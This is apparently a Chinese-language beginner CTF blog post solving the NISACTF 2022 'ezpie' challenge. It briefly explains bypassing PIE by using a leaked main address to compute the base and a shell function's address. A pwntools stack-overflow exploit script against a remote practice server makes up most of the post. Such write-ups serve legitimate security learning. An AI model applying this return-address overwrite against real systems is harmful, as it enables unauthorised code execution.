---
title: PWN入门-ret2pie做题
date: 2024-01-26 22:34:15
tags: PWN
mathjax: true
---

# PWN入门-ret2pie做题

## [NISACTF 2022]ezpie

PIE保护时基地址随机，先泄漏main地址，直接给了。计算偏移算shell函数地址。

```python
from pwn import *
context(log_level='debug',os='linux',arch='i386')
p=remote("node5.anna.nssctf.cn",28166)
p.recvuntil("0x") #地址前缀0x
main_addr=int(p.recv(8),16) #8位地址以16进制形式读
p.recvuntil("Input:")
elf_base=main_addr-0x770 #计算偏移
stack_overflow=b'a'*(0x28+4)
shell_addr=p32(elf_base+0x80f) #求真实shell地址
payload1=flat([stack_overflow,shell_addr])
p.sendline(payload1)
p.interactive()
```
